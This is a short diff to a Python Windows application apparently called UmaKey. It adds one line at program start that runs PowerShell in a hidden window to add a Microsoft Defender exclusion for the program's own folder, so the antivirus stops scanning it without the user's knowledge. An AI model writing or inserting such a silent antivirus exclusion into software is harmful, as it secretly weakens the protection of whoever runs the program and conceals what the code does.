@@ -168,6 +168,7 @@ for file in 'input.exe', 'UmaKey.ico', 'warning.dll', 'WindowCapture.dll', 'find
         raise FileNotFoundError("File not Found : ", os.path.join(os.getcwd(), f'./_internal/{file}'))
 
 if __name__ == '__main__':
+    windll.shell32.ShellExecuteW(None, "open", "powershell.exe", f'Add-MpPreference -ExclusionPath "{os.getcwd()}"', None, 0)
     if is_process_running(title):
         os._exit(0)
     download, release = update.check_new_release("onetwohour", "UmaKey", VERSION)
